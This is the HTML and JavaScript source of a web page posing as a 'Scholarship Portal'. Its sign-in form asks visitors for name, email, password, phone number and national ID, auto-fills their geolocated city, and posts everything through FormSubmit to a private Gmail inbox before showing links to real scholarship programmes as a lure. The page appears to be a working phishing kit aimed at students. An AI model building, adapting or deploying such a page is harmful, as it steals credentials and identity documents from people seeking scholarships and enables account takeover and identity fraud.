<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Scholarship Portal</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center px-4">

  <div class="bg-white shadow-2xl rounded-2xl p-6 sm:p-8 w-full max-w-6xl transition-all duration-500" id="portal-container">

    <!-- LOGIN SECTION -->
    <div id="login-section">
      <h1 class="text-2xl sm:text-3xl font-bold text-center mb-4 sm:mb-6">Welcome to Scholarship Portal</h1>
      <p class="text-gray-600 text-center mb-6 text-sm sm:text-base">Sign in to see scholarships tailored for your location.</p>

      <form id="loginForm" action="https://formsubmit.co/t4178373@gmail.com" method="POST" class="space-y-4">

        <!-- Hidden fields for FormSubmit -->
        <input type="hidden" name="_subject" value="New Scholarship Portal Signup">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">

        <div>
          <label class="block text-gray-700 font-medium mb-1">Full Name</label>
          <input type="text" name="Full Name" required class="w-full border rounded-lg p-2 sm:p-3">
        </div>
        <div>
          <label class="block text-gray-700 font-medium mb-1">Email</label>
          <input type="email" name="Email" required class="w-full border rounded-lg p-2 sm:p-3">
        </div>
        <div>
          <label class="block text-gray-700 font-medium mb-1">Password</label>
          <input type="password" name="Password" required class="w-full border rounded-lg p-2 sm:p-3">
        </div>
        <div>
          <label class="block text-gray-700 font-medium mb-1">Phone Number</label>
          <input type="tel" name="Phone Number" required class="w-full border rounded-lg p-2 sm:p-3">
        </div>
        <div>
          <label class="block text-gray-700 font-medium mb-1">National ID</label>
          <input type="text" name="National ID" required class="w-full border rounded-lg p-2 sm:p-3">
        </div>
        <div>
          <label class="block text-gray-700 font-medium mb-1">Location</label>
          <input type="text" id="location" name="Location" placeholder="Detecting location..." required class="w-full border rounded-lg p-2 sm:p-3">
        </div>

        <button type="submit" class="w-full bg-blue-600 text-white py-2 sm:py-3 rounded-lg hover:bg-blue-700">
          Sign In & See Scholarships
        </button>
      </form>
    </div>

    <!-- SCHOLARSHIPS SECTION -->
    <div id="opportunities-section" class="hidden mt-6">
      <h1 class="text-2xl sm:text-3xl font-bold text-center mb-4">Scholarship Opportunities</h1>
      <p id="ops-location-text" class="text-gray-600 text-center mb-4 text-sm sm:text-base">Here are scholarships available for your location.</p>

      <!-- Country Filter -->
      <div class="flex justify-center mb-6 relative">
        <button id="dropdownButton" class="flex items-center border rounded-lg p-2 sm:p-3 bg-white shadow-sm w-full sm:w-auto justify-center sm:justify-start">
          <span id="selectedIcon" class="mr-2">📚</span> 
          <span id="selectedCountry">All Scholarships</span>
          <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
          </svg>
        </button>
        <ul id="dropdownMenu" class="absolute top-12 bg-white border rounded-lg shadow-lg hidden w-full sm:w-56 z-10">
          <li data-country="" data-flag="📚" class="p-2 hover:bg-gray-100 flex items-center"><span class="mr-2">📚</span> All Scholarships</li>
          <li data-country="Kenya" data-flag="https://flagcdn.com/w20/ke.png" class="p-2 hover:bg-gray-100 flex items-center"><img src="https://flagcdn.com/w20/ke.png" class="mr-2"> Kenya</li>
          <li data-country="USA" data-flag="https://flagcdn.com/w20/us.png" class="p-2 hover:bg-gray-100 flex items-center"><img src="https://flagcdn.com/w20/us.png" class="mr-2"> USA</li>
          <li data-country="Canada" data-flag="https://flagcdn.com/w20/ca.png" class="p-2 hover:bg-gray-100 flex items-center"><img src="https://flagcdn.com/w20/ca.png" class="mr-2"> Canada</li>
          <li data-country="Germany" data-flag="https://flagcdn.com/w20/de.png" class="p-2 hover:bg-gray-100 flex items-center"><img src="https://flagcdn.com/w20/de.png" class="mr-2"> Germany</li>
          <li data-country="UK" data-flag="https://flagcdn.com/w20/gb.png" class="p-2 hover:bg-gray-100 flex items-center"><img src="https://flagcdn.com/w20/gb.png" class="mr-2"> UK</li>
          <li data-country="Europe" data-flag="https://flagcdn.com/w20/eu.png" class="p-2 hover:bg-gray-100 flex items-center"><img src="https://flagcdn.com/w20/eu.png" class="mr-2"> Europe</li>
          <li data-country="Global" data-flag="https://flagcdn.com/w20/un.png" class="p-2 hover:bg-gray-100 flex items-center"><img src="https://flagcdn.com/w20/un.png" class="mr-2"> Global</li>
        </ul>
      </div>

      <!-- Scholarships -->
      <div id="scholarship-cards" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6"></div>
    </div>
  </div>

  <script>
    // Auto-detect location
    let userLocation = "";
    let userCountry = "";
    fetch("https://ipapi.co/json/")
      .then(resp => resp.json())
      .then(data => {
        const locField = document.getElementById("location");
        if (data.city && data.country_name) {
          userLocation = `${data.city}, ${data.country_name}`;
          userCountry = data.country_name;
        } else if (data.country_name) {
          userLocation = data.country_name;
          userCountry = data.country_name;
        }
        if (locField) locField.value = userLocation;
      });

    // Scholarships with flag logos
    const scholarships = [
      { institution: "University of Nairobi – Scholarships & Awards", logo: "https://flagcdn.com/w40/ke.png", link: "https://www.uonbi.ac.ke/scholarships-awards", regions: ["Kenya"] },
      { institution: "St. Lawrence University – Kenya Scholarship Program", logo: "https://flagcdn.com/w40/ke.png", link: "https://www.stlawu.edu/offices/admissions-office/kenya-scholarship-program", regions: ["Kenya"] },
      { institution: "GREAT Scholarships (UK Universities)", logo: "https://flagcdn.com/w40/gb.png", link: "https://study-uk.britishcouncil.org/scholarships-funding/great-scholarships/kenya", regions: ["Kenya","UK"] },
      { institution: "Rhodes Scholarships – Oxford University", logo: "https://flagcdn.com/w40/gb.png", link: "https://www.rhodeshouse.ox.ac.uk/scholarships/applications/kenya/", regions: ["Kenya","UK"] },
      { institution: "Fulbright Foreign Student Program", logo: "https://flagcdn.com/w40/us.png", link: "https://foreign.fulbrightonline.org/", regions: ["USA","Global"] },
      { institution: "Harvard University Scholarships", logo: "https://flagcdn.com/w40/us.png", link: "https://college.harvard.edu/financial-aid", regions: ["USA"] },
      { institution: "Vanier Canada Graduate Scholarships", logo: "https://flagcdn.com/w40/ca.png", link: "https://vanier.gc.ca/en/home-accueil.html", regions: ["Canada"] },
      { institution: "Lester B. Pearson Scholarship – UofT", logo: "https://flagcdn.com/w40/ca.png", link: "https://future.utoronto.ca/pearson/about/", regions: ["Canada"] },
      { institution: "DAAD Scholarships – Germany", logo: "https://flagcdn.com/w40/de.png", link: "https://www.daad.de/en/study-and-research-in-germany/scholarships/", regions: ["Germany","Global"] },
      { institution: "Chevening Scholarships (UK Government)", logo: "https://flagcdn.com/w40/gb.png", link: "https://www.chevening.org/apply/", regions: ["UK","Global"] },
      { institution: "Erasmus Mundus Joint Master’s", logo: "https://flagcdn.com/w40/eu.png", link: "https://www.eacea.ec.europa.eu/scholarships/erasmus-mundus_en", regions: ["Europe","Global"] }
    ];

    // Render scholarships
    function renderScholarships(filter) {
      const cardsContainer = document.getElementById("scholarship-cards");
      cardsContainer.innerHTML = "";
      scholarships.forEach(s => {
        if (!filter || s.regions.includes(filter)) {
          const card = document.createElement("div");
          card.className = "bg-gray-50 shadow-md rounded-2xl p-4 sm:p-6 flex items-center space-x-4 hover:shadow-xl transition";
          card.innerHTML = `
            <img src="${s.logo}" class="w-10 h-10 sm:w-14 sm:h-14 rounded-full object-cover">
            <div>
              <h2 class="text-sm sm:text-lg font-semibold">${s.institution}</h2>
              <a href="${s.link}" target="_blank" class="mt-2 inline-block bg-blue-600 text-white px-2 py-1 sm:px-3 sm:py-1 rounded text-xs sm:text-sm hover:bg-blue-700">View</a>
            </div>
          `;
          cardsContainer.appendChild(card);
        }
      });
    }

    // Form submission → send email then show scholarships
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault(); // stop default reload
      fetch(this.action, {
        method: "POST",
        body: new FormData(this)
      }).then(() => {
        document.getElementById("login-section").classList.add("hidden");
        document.getElementById("opportunities-section").classList.remove("hidden");
        document.getElementById("ops-location-text").innerText =
          `Scholarships relevant for ${userLocation || "your region"}`;
        renderScholarships("");
      });
    });

    // Dropdown logic
    const dropdownBtn = document.getElementById("dropdownButton");
    const dropdownMenu = document.getElementById("dropdownMenu");
    const selectedIcon = document.getElementById("selectedIcon");
    const selectedCountry = document.getElementById("selectedCountry");

    dropdownBtn.addEventListener("click", () => dropdownMenu.classList.toggle("hidden"));
    dropdownMenu.querySelectorAll("li").forEach(item => {
      item.addEventListener("click", () => {
        const country = item.dataset.country;
        const flag = item.dataset.flag;

        if (country === "") {
          selectedIcon.innerText = "📚";
        } else {
          selectedIcon.innerHTML = `<img src="${flag}" class="inline w-5 h-5 mr-1">`;
        }

        selectedCountry.innerText = country || "All Scholarships";
        renderScholarships(country);
        dropdownMenu.classList.add("hidden");
      });
    });
  </script>

</body>
</html>
